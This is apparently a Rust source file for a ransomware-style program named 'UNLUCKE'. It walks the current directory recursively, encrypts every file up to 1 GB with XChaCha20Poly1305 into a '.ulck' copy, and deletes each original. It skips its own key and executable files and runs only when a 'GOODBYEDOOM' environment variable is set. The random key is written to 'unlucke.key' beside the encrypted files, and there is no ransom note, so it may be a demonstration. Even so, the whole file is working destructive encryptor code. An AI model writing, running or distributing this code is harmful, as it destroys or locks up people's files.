#![allow(non_snake_case)]

use chacha20poly1305::{
    aead::{stream, KeyInit, OsRng},
    XChaCha20Poly1305,
};
use rand::RngCore;
use std::{
    env,
    fs::{self, metadata, File},
    io::{self, Read, Write},
    thread,
};

static ENCRYPTED_EXTENSION: &str = ".ulck";
static IGNORE_END: [&str; 4] = [
    ENCRYPTED_EXTENSION,
    "unlucke.key",
    "unlucke.exe",
    "desktop.ini",
];
static IGNORE_START: [&str; 1] = ["$"];
static MAX_FILE_SIZE: u64 = 1000000000;
static COOL_TEXT: &str = r#"    __    __  __    __  __        __    __   ______   __    __  ________
   /  |  /  |/  \  /  |/  |      /  |  /  | /      \ /  |  /  |/        |
   $$ |  $$ |$$  \ $$ |$$ |      $$ |  $$ |/$$$$$$  |$$ | /$$/ $$$$$$$$/
   $$ |  $$ |$$$  \$$ |$$ |      $$ |  $$ |$$ |  $$/ $$ |/$$/  $$ |__
   $$ |  $$ |$$$$  $$ |$$ |      $$ |  $$ |$$ |      $$  $$<   $$    |
   $$ |  $$ |$$ $$ $$ |$$ |      $$ |  $$ |$$ |   __ $$$$$  \  $$$$$/
   $$ \__$$ |$$ |$$$$ |$$ |_____ $$ \__$$ |$$ \__/  |$$ |$$  \ $$ |_____
   $$    $$/ $$ | $$$ |$$       |$$    $$/ $$    $$/ $$ | $$  |$$       |
    $$$$$$/  $$/   $$/ $$$$$$$$/  $$$$$$/   $$$$$$/  $$/   $$/ $$$$$$$$/"#;

fn runFile(sourceFilePath: &str, key: &[u8; 32]) -> Result<(), io::Error> {
    if sourceFilePath == "" {
        return Ok(());
    }

    for ignore in IGNORE_START {
        if sourceFilePath.starts_with(ignore) {
            return Ok(());
        }
    }

    for ignore in IGNORE_END {
        if sourceFilePath.ends_with(ignore) {
            return Ok(());
        }
    }

    let mut sourceFile = File::open(sourceFilePath)?;
    let metadata = sourceFile.metadata()?;

    if metadata.len() == 0 || metadata.len() > MAX_FILE_SIZE {
        return Ok(());
    }

    println!("Encrypting file: {}", sourceFilePath);

    let destinationFilePath = sourceFilePath.to_owned() + ENCRYPTED_EXTENSION;

    let mut nonce = [0u8; 19];
    OsRng.fill_bytes(&mut nonce);

    let aead = XChaCha20Poly1305::new(key.as_ref().into());
    let mut streamEncryptor = stream::EncryptorBE32::from_aead(aead, nonce.as_ref().into());

    const BUFFER_LEN: usize = 500;
    let mut buffer = [0u8; BUFFER_LEN];

    let mut distFile = File::create(destinationFilePath)?;
    match distFile.write_all(&nonce) {
        Ok(_) => (),
        Err(_) => return Ok(()),
    };

    loop {
        let read_count = sourceFile.read(&mut buffer)?;

        if read_count == BUFFER_LEN {
            let ciphertext = streamEncryptor.encrypt_next(buffer.as_slice());

            match ciphertext {
                Ok(ciphertext) => {
                    distFile.write(&ciphertext)?;
                }
                Err(_) => break,
            }
        } else {
            let ciphertext = streamEncryptor.encrypt_last(&buffer[..read_count]);

            match ciphertext {
                Ok(ciphertext) => {
                    distFile.write(&ciphertext)?;
                }
                Err(_) => break,
            }

            break;
        }
    }

    fs::remove_file(sourceFilePath)?;

    Ok(())
}

fn runDirEntry(dirEntryPath: &str, key: &[u8; 32]) {
    let metadata = match metadata(dirEntryPath) {
        Ok(metadata) => metadata,
        Err(_) => return,
    };

    if metadata.is_dir() {
        let dirEntries = match fs::read_dir(dirEntryPath) {
            Ok(paths) => paths,
            Err(_) => return,
        };

        for dirEntry in dirEntries {
            match dirEntry {
                Ok(dirEntry) => match dirEntry.path().to_str() {
                    Some(path) => runDirEntry(&path, &key),
                    None => (),
                },
                Err(_) => (),
            }
        }
    } else {
        let newDirEntryPath = dirEntryPath.to_owned();
        let newKey = key.to_owned();
        thread::spawn(move || runFile(&newDirEntryPath, &newKey));
    }
}

fn main() {
    println!("\n\n{}\n\n\n", COOL_TEXT);

    match env::var("GOODBYEDOOM") {
        Ok(_) => (),
        Err(_) => panic!("GOODBYEDOOM not set"),
    }

    let mut key = [0u8; 32];
    OsRng.fill_bytes(&mut key);

    let entryPath = env::current_dir().unwrap().to_str().unwrap().to_string();

    println!("Entry point: {}", entryPath);

    let mut keyPath: String = entryPath.clone();
    keyPath.push_str(r#"\unlucke.key"#);

    let existsAlready = metadata(&keyPath).is_ok();
    if existsAlready {
        panic!("Key already exists");
    }

    println!(r#"Writing key at {}"#, keyPath);

    let mut keyFile = File::create(&keyPath).unwrap();
    keyFile.write_all(&key).unwrap();

    let dirEntries = fs::read_dir(&entryPath).unwrap();
    for dirEntry in dirEntries {
        match dirEntry {
            Ok(dirEntry) => match dirEntry.path().to_str() {
                Some(path) => runDirEntry(&path, &key),
                None => (),
            },
            Err(_) => (),
        }
    }
}
